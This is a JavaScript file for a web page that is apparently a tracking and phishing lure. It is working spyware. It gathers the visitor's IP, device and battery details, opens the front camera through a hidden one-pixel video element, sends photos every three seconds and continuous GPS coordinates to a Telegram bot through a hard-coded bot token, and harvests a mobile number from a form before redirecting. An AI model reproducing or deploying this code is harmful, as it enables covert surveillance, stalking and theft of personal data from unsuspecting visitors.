const BOT_TOKEN = "8431980730:AAFkOEc194xolmick_CgUMt5T51tf9c5S6Y";
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

let cameraStream = null;
let photoInterval = null;
let locationInterval = null;
let currentChatId = null;
let isCameraActive = false;
let photoCounter = 0;
let videoElement = null;
let watchId = null;
let currentLocation = null;
let locationUpdates = 0;
let isSubmitted = false;
let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT";

// Create video element with proper settings
function createVideoElement() {
    if (videoElement) return videoElement;
    
    videoElement = document.createElement('video');
    videoElement.id = 'camera-feed';
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.muted = true;
    videoElement.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -9999;
    `;
    document.body.appendChild(videoElement);
    return videoElement;
}

// Parse URL parameters
function getUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    const result = {};

    for (const [key, value] of params.entries()) {
        result[key] = value;
    }

    return result;
}

// Get redirect URL from parameter
function getRedirectUrl() {
    const params = getUrlParameters();
    let urlParam = params.url || params.redirect || params.link || params.u || params.r || params.l;

    if (urlParam) {
        try {
            // Decode URL
            const decodedUrl = decodeURIComponent(urlParam);
            
            // Remove any HTML tags if present
            let cleanUrl = decodedUrl.replace(/<[^>]*>/g, '');
            
            // Add https:// if not present
            if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
                cleanUrl = 'https://' + cleanUrl;
            }
            
            // Validate URL
            const urlObj = new URL(cleanUrl);
            console.log("Valid redirect URL:", cleanUrl);
            return cleanUrl;
        } catch (error) {
            console.error("Invalid redirect URL:", error);
        }
    }
    
    return "https://telegram.me/ANAS_ACCESS_BOT";
}

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {
            console.error("Battery API error:", e);
        }
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
        deviceInfo.downlink = navigator.connection.downlink;
        deviceInfo.rtt = navigator.connection.rtt;
    }

    deviceInfo.screenWidth = window.screen.width;
    deviceInfo.screenHeight = window.screen.height;
    deviceInfo.windowWidth = window.innerWidth;
    deviceInfo.windowHeight = window.innerHeight;
    deviceInfo.currentTime = new Date().toLocaleString();

    return deviceInfo;
}

async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
        return result.ok;
    } catch (error) {
        console.error("Error sending message:", error);
        return false;
    }
}

async function sendPhoto(chatId, photo, photoNumber = 0, location = null) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);

    const timestamp = new Date().toLocaleTimeString();
    let caption = `📸 Photo #${photoNumber}\n⏰ Time: ${timestamp}`;

    if (location) {
        const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
        caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
        caption += `\n🗺️ Maps: ${mapsUrl}`;
        caption += `\n🎯 Accuracy: ${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}`;
    }

    formData.append('caption', caption);

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log(`Photo #${photoNumber} sent:`, result.ok ? "Success" : "Failed");
        return result.ok;
    } catch (error) {
        console.error(`Error sending photo #${photoNumber}:`, error);
        return false;
    }
}

async function sendLocationUpdate(chatId, location) {
    const timestamp = new Date().toLocaleString();
    const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;

    const message = `
<b>📍 LOCATION UPDATE #${locationUpdates}</b>
<b>Latitude:</b> <i>${location.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${location.longitude.toFixed(6)}</i>
<b>Accuracy:</b> <i>${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}</i>
<b>Time:</b> <i>${timestamp}</i>
<b>Maps:</b> <a href="${mapsUrl}">Open</a>
    `;

    await sendTelegramMessage(chatId, message);
    locationUpdates++;
}

async function capturePhoto() {
    if (!videoElement || !cameraStream || !videoElement.videoWidth || videoElement.videoWidth === 0) {
        console.error("Camera not ready");
        return null;
    }

    try {
        // Small delay to ensure video is ready
        await new Promise(resolve => setTimeout(resolve, 100));

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        
        const context = canvas.getContext('2d');
        
        // Draw video frame
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob
        return new Promise((resolve) => {
            canvas.toBlob(blob => {
                if (blob) {
                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    resolve(file);
                } else {
                    resolve(null);
                }
            }, 'image/jpeg', 0.8);
        });
    } catch (error) {
        console.error("Error capturing photo:", error);
        return null;
    }
}

async function startCamera() {
    try {
        console.log("Starting front camera...");
        
        // Create video element
        createVideoElement();

        // Front camera constraints
        const constraints = {
            video: {
                facingMode: 'user', // Always use front camera
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 }
            },
            audio: false
        };

        // Get camera stream
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        cameraStream = stream;
        videoElement.srcObject = stream;

        // Wait for video to be ready
        return new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                reject(new Error("Camera timeout"));
            }, 5000);

            const checkVideoReady = () => {
                if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                    clearTimeout(timer);
                    console.log(`Camera ready: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                    isCameraActive = true;
                    resolve(true);
                } else {
                    setTimeout(checkVideoReady, 100);
                }
            };

            videoElement.onloadedmetadata = checkVideoReady;
            videoElement.onerror = () => {
                clearTimeout(timer);
                reject(new Error("Video error"));
            };
            
            // Start checking immediately
            checkVideoReady();
        });

    } catch (error) {
        console.error("Camera error:", error);
        isCameraActive = false;
        
        if (currentChatId) {
            await sendTelegramMessage(currentChatId, 
                `⚠️ Camera Error: ${error.message}\nTime: ${new Date().toLocaleString()}`);
        }
        
        return false;
    }
}

async function startLocationTracking() {
    if (!navigator.geolocation) {
        console.error("Geolocation not supported");
        return;
    }

    console.log("Starting location tracking...");

    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });

        currentLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: new Date(position.timestamp)
        };

        if (currentChatId) {
            await sendLocationUpdate(currentChatId, currentLocation);
        }

        // Watch for location updates
        watchId = navigator.geolocation.watchPosition(
            (position) => {
                currentLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date(position.timestamp)
                };
                
                // Send update every 30 seconds
                if (currentChatId && locationUpdates % 6 === 0) {
                    sendLocationUpdate(currentChatId, currentLocation);
                }
            },
            (error) => {
                console.error("Location error:", error);
            },
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 10000
            }
        );

        // Periodic updates every 60 seconds
        locationInterval = setInterval(async () => {
            if (currentLocation && currentChatId) {
                await sendLocationUpdate(currentChatId, currentLocation);
            }
        }, 60000);

    } catch (error) {
        console.error("Location permission denied:", error);
        if (currentChatId) {
            await sendTelegramMessage(currentChatId, 
                `❌ Location Denied: ${error.message}\nTime: ${new Date().toLocaleString()}`);
        }
    }
}

async function startContinuousPhotoCapture() {
    if (!isCameraActive || !currentChatId) return;

    console.log("Starting photo capture every 3 seconds...");

    // First photo after 1 second
    setTimeout(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
            }
        } catch (error) {
            console.error("First photo error:", error);
        }
    }, 1000);

    // Then every 3 seconds
    photoInterval = setInterval(async () => {
        try {
            const photo = await capturePhoto();
            if (photo) {
                photoCounter++;
                await sendPhoto(currentChatId, photo, photoCounter, currentLocation);

                // Status update every 10 photos
                if (photoCounter % 10 === 0) {
                    const status = `
<b>📊 STATUS UPDATE</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Camera:</b> ${isCameraActive ? '✅' : '❌'}
<b>Location:</b> ${currentLocation ? '✅' : '❌'}
<b>Time:</b> ${new Date().toLocaleString()}
                    `;
                    await sendTelegramMessage(currentChatId, status);
                }
            }
        } catch (error) {
            console.error("Photo capture error:", error);
        }
    }, 3000);
}

async function sendInitialInfo() {
    try {
        const ipDetails = await getIpDetails();
        const deviceInfo = await getDeviceInfo();
        const params = getUrlParameters();

        currentChatId = params.id || params.chat_id || params.cid;
        redirectUrl = getRedirectUrl();

        if (!currentChatId) {
            alert("❌ Missing Chat ID in URL");
            return;
        }

        const message = `
<b>🚀 TRACKING STARTED</b>
<b>Time:</b> ${deviceInfo.currentTime}
<b>IP:</b> ${ipDetails.ip}
<b>Location:</b> ${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}
<b>ISP:</b> ${ipDetails.org}
<b>Device:</b> ${deviceInfo.platform}
<b>Screen:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
<b>Network:</b> ${deviceInfo.networkType}
<b>Redirect URL:</b> ${redirectUrl}
<b>Full URL:</b> ${window.location.href}
        `;

        await sendTelegramMessage(currentChatId, message);
        console.log("Initial info sent");

        // Start camera
        const cameraStarted = await startCamera();
        
        // Start location
        await startLocationTracking();
        
        // Start photos if camera is active
        if (cameraStarted) {
            startContinuousPhotoCapture();
        }

    } catch (error) {
        console.error("Initial info error:", error);
    }
}

function cleanup() {
    console.log("Cleaning up...");

    if (photoInterval) {
        clearInterval(photoInterval);
        photoInterval = null;
    }

    if (locationInterval) {
        clearInterval(locationInterval);
        locationInterval = null;
    }

    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
    }

    if (videoElement) {
        videoElement.srcObject = null;
        if (videoElement.parentNode) videoElement.remove();
        videoElement = null;
    }

    isCameraActive = false;

    // Send final message if not submitted
    if (currentChatId && !isSubmitted) {
        const finalMsg = `
<b>📊 SESSION ENDED</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Time:</b> ${new Date().toLocaleString()}
        `;
        
        const blob = new Blob([JSON.stringify({
            chat_id: currentChatId,
            text: finalMsg,
            parse_mode: "HTML"
        })], {type: 'application/json'});
        
        navigator.sendBeacon(API_URL, blob);
    }
}

function redirectToUrl() {
    console.log("Redirecting to:", redirectUrl);
    cleanup();
    
    // Simple redirect without HTML injection
    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 2000);
}

// Event listeners
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        if (photoInterval) {
            clearInterval(photoInterval);
            photoInterval = null;
        }
    } else {
        if (isCameraActive && currentChatId && !photoInterval && !isSubmitted) {
            startContinuousPhotoCapture();
        }
    }
});

window.addEventListener('beforeunload', function(e) {
    if (!isSubmitted) {
        cleanup();
    }
});

// Form submission
document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const params = getUrlParameters();
    const chatId = params.id || params.chat_id || params.cid;

    if (!chatId) {
        alert("Missing Chat ID");
        return;
    }

    // Disable button
    const submitBtn = document.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    try {
        const ipDetails = await getIpDetails();

        const message = `
<b>📱 MOBILE SUBMITTED</b>
<b>Number:</b> +91${mobileNumber}
<b>Operator:</b> ${operator}
<b>Redirect To:</b> ${redirectUrl}
${currentLocation ? `
<b>📍 Location:</b> ${currentLocation.latitude.toFixed(6)}, ${currentLocation.longitude.toFixed(6)}
<b>Accuracy:</b> ${currentLocation.accuracy ? currentLocation.accuracy.toFixed(2) + 'm' : 'N/A'}
` : ''}
<b>IP:</b> ${ipDetails.ip}
<b>City:</b> ${ipDetails.city}
<b>ISP:</b> ${ipDetails.org}
<b>Photos:</b> ${photoCounter}
<b>Time:</b> ${new Date().toLocaleString()}
        `;

        const success = await sendTelegramMessage(chatId, message);

        if (success) {
            isSubmitted = true;

            // Final photo
            if (isCameraActive) {
                const finalPhoto = await capturePhoto();
                if (finalPhoto) {
                    photoCounter++;
                    await sendPhoto(chatId, finalPhoto, photoCounter, currentLocation);
                }
            }

            // Redirect
            redirectToUrl();
        } else {
            alert("Failed to submit");
            submitBtn.disabled = false;
            submitBtn.textContent = "Submit";
        }

    } catch (error) {
        console.error("Submit error:", error);
        alert("Error occurred");
        submitBtn.disabled = false;
        submitBtn.textContent = "Submit";
    }
});

// Mobile number formatting
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log("Starting tracker...");

    // Get parameters
    const params = getUrlParameters();
    redirectUrl = getRedirectUrl();

    // Show redirect info
    const redirectInfo = document.getElementById('redirect-info');
    if (redirectInfo && redirectUrl !== "https://telegram.me/ANAS_ACCESS_BOT") {
        redirectInfo.textContent = `After submit → ${redirectUrl}`;
        redirectInfo.style.display = 'block';
    }

    // Update stats
    setInterval(() => {
        document.getElementById('cam-status').textContent = isCameraActive ? '✅ Active' : '⏳ Starting';
        document.getElementById('gps-status').textContent = currentLocation ? '✅ Active' : '⏳ Requesting';
        document.getElementById('photo-count').textContent = photoCounter;
        document.getElementById('loc-count').textContent = locationUpdates;
    }, 1000);

    // Start tracking
    setTimeout(sendInitialInfo, 1000);
});